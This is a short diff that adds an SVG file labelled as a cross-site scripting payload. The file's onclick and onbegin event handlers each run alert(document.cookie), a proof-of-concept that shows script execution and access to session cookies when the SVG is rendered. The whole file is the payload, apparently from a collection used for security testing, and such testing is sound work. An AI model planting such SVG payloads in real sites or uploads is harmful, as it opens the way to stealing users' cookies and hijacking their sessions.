@@ -1,0 +1,6 @@
+<!-- Payload 1: Using path with alert -->
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+   <path d="M10 10" onclick="alert(document.cookie)"/>
+   <animate attributeName="x" begin="0s" dur="0s" 
+   from="0" to="1" onbegin="alert(document.cookie)"/>
+</svg>
